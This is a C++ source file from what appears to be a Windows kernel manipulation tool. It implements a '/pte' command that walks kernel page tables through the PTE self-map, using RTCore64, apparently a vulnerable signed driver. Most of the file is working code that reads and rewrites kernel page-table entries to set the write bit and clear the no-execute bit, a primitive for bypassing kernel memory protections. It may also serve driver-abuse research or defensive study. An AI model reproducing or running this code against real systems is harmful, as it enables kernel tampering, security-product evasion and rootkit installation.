#include <Windows.h>
#include <cstdio>
#include <cstring>
#include "driver/IDriverBackend.h"
#include "globals.h"
#include "kutil.h"
#include "pte.h"

// ─────────────────────────────────────────────────────────────────────────────
// /pte <addr> [--set-write] [--clear-nx] [--restore <val>]
//
// Walk all four page-table levels for a kernel VA and print each entry.
// Uses the PTE self-map (MmPteBase) so every level is readable via RTCore64.
//
// Derived entry VAs (using PteVaOf recursively):
//   PTE   VA = MmPteBase + ((va      & 0x0000FFFFFFFFF000) >> 9)
//   PDE   VA = MmPteBase + ((pteVA   & 0x0000FFFFFFFFF000) >> 9)
//   PDPTE VA = MmPteBase + ((pdeVA   & 0x0000FFFFFFFFF000) >> 9)
//   PML4E VA = MmPteBase + ((pdpteVA & 0x0000FFFFFFFFF000) >> 9)
// ─────────────────────────────────────────────────────────────────────────────

static const char* FmtFlags(DWORD64 val, bool isLeaf) {
    static char buf[64];
    bool present   = (val & (1ULL << 0)) != 0;
    bool write     = (val & (1ULL << 1)) != 0;
    bool user      = (val & (1ULL << 2)) != 0;
    bool accessed  = (val & (1ULL << 5)) != 0;
    bool dirty     = (val & (1ULL << 6)) != 0;
    bool largePg   = (val & (1ULL << 7)) != 0;
    bool global    = (val & (1ULL << 8)) != 0;
    bool nx        = (val & (1ULL << 63)) != 0;

    snprintf(buf, sizeof(buf), "%s%s%s%s%s%s%s%s",
        present  ? "P "  : "!P ",
        write    ? "W "  : "R ",
        user     ? "U "  : "K ",
        nx       ? "NX " : "X  ",
        global   ? "G " : "",
        accessed ? "A " : "",
        dirty    ? "D " : "",
        (!isLeaf && largePg) ? "PS(large) " : "");
    return buf;
}

// Apply requested modifications to an entry at entryVA.
// restoreVal != 0 overrides everything: raw write of restoreVal.
// Otherwise: set W bit if setWrite, clear NX bit if clearNx.
// isLeaf: true for PTE, false for PDE/PDPTE (affects FmtFlags only).
static void ApplyLeafMod(DWORD64 entryVA, const char* levelName,
                         bool isLeaf,
                         bool setWrite, bool clearNx, DWORD64 restoreVal) {
    if (!setWrite && !clearNx && restoreVal == 0) return;

    DWORD64 cur = g_drv->Rd64(entryVA);

    if (restoreVal != 0) {
        // --restore: write exact value regardless of current
        bool atomic = g_drv->Wr64Atomic(entryVA, restoreVal);
        printf("\n  [+] RESTORE %s: 0x%016llX -> 0x%016llX  (%s)\n",
               levelName, cur, restoreVal,
               atomic ? "ATOMIC 8B" : "hi-lo fallback");
        DWORD64 verify = g_drv->Rd64(entryVA);
        printf("  [*] %s after write: 0x%016llX  [%s]\n",
               levelName, verify, FmtFlags(verify, isLeaf));
        return;
    }

    DWORD64 newVal = cur;
    if (setWrite)  newVal |=  (1ULL << 1);   // set W
    if (clearNx)   newVal &= ~(1ULL << 63);  // clear NX

    if (newVal == cur) {
        printf("\n  [=] %s flags already as requested — no change\n", levelName);
        return;
    }

    bool atomic = g_drv->Wr64Atomic(entryVA, newVal);
    printf("\n  [+] %s modified: 0x%016llX -> 0x%016llX  (%s)\n",
           levelName, cur, newVal,
           atomic ? "ATOMIC 8B" : "hi-lo fallback");
    if (setWrite && !(cur & (1ULL << 1)))   printf("       W bit: 0 -> 1\n");
    if (clearNx  &&  (cur & (1ULL << 63)))  printf("      NX bit: 1 -> 0\n");

    DWORD64 verify = g_drv->Rd64(entryVA);
    printf("  [*] %s after write: 0x%016llX  [%s]\n",
           levelName, verify, FmtFlags(verify, isLeaf));
}

void CmdPte(DWORD64 va, bool setWrite, bool clearNx, DWORD64 restoreVal) {
    // Build modifier suffix for the header line
    char modSuffix[64] = "";
    if (restoreVal)      snprintf(modSuffix, sizeof(modSuffix), "  [--restore 0x%016llX]", restoreVal);
    else if (setWrite && clearNx) snprintf(modSuffix, sizeof(modSuffix), "  [--set-write --clear-nx]");
    else if (setWrite)   snprintf(modSuffix, sizeof(modSuffix), "  [--set-write]");
    else if (clearNx)    snprintf(modSuffix, sizeof(modSuffix), "  [--clear-nx]");

    printf("[*] Walking page tables for VA 0x%016llX%s\n\n", va, modSuffix);

    // Pre-flight safety check if writing PTE
    if (setWrite || clearNx || restoreVal) {
        if (!PteSafetyCheck(va)) {
            printf("[!] Aborting PTE modification — safety check failed.\n");
            return;
        }
    }

    // Ensure MmPteBase is resolved
    DWORD64 pteBase = GetMmPteBase();
    if (!pteBase) {
        printf("[!] MmPteBase unavailable — cannot walk page tables\n");
        printf("    Run /ptebase to scan, or /ptebase-set <val> to inject manually.\n");
        return;
    }
    printf("[*] MmPteBase = 0x%016llX\n\n", pteBase);

    // pteVaOf: given any VA, return the VA of its PTE in the self-map
    auto pteVaOf = [&](DWORD64 addr) -> DWORD64 {
        return pteBase + ((addr & 0x0000FFFFFFFFF000ULL) >> 9);
    };

    DWORD64 pteVA   = pteVaOf(va);
    DWORD64 pdeVA   = pteVaOf(pteVA);
    DWORD64 pdpteVA = pteVaOf(pdeVA);
    DWORD64 pml4eVA = pteVaOf(pdpteVA);

    struct Level {
        const char* name;
        DWORD64     entryVA;
        bool        canBeLarge;
        DWORD64     largeOffsetMask;
    };
    Level levels[] = {
        { "PML4E", pml4eVA, false, 0            },
        { "PDPTE", pdpteVA, true,  0x3FFFFFFFULL },   // 1 GB
        { "PDE  ", pdeVA,   true,  0x1FFFFFULL   },   // 2 MB
        { "PTE  ", pteVA,   false, 0xFFFULL       },   // 4 KB
    };

    DWORD64 physBase = 0;
    for (int i = 0; i < 4; i++) {
        auto& lv = levels[i];
        DWORD64 val = g_drv->Rd64(lv.entryVA);
        bool present = (val & 1) != 0;
        bool largePg = (val & (1ULL << 7)) != 0;
        DWORD64 pa   = val & 0x000FFFFFFFFFF000ULL;

        printf("  %-5s  entryVA=0x%016llX\n"
               "         raw=0x%016llX\n"
               "         PA =0x%012llX  [%s]\n",
               lv.name, lv.entryVA, val, pa, FmtFlags(val, i == 3));

        if (!present) {
            printf("\n  [!] Not present — page table walk stops here\n");
            return;
        }

        if (lv.canBeLarge && largePg) {
            DWORD64 pageOffset = va & lv.largeOffsetMask;
            DWORD64 phys = pa | pageOffset;
            printf("         *** Large page (PS=1) ***\n");
            // Modifications apply to this large-page entry (PDE or PDPTE)
            ApplyLeafMod(lv.entryVA, lv.name, false,
                         setWrite, clearNx, restoreVal);
            printf("\n  [*] Physical address: 0x%012llX\n", phys);
            return;
        }

        physBase = pa;
        printf("\n");
    }

    // 4 KB page
    DWORD64 phys = physBase | (va & 0xFFFULL);
    printf("  [*] Physical address: 0x%012llX\n", phys);

    // Modifications apply to the PTE
    ApplyLeafMod(pteVA, "PTE  ", true,
                 setWrite, clearNx, restoreVal);
}
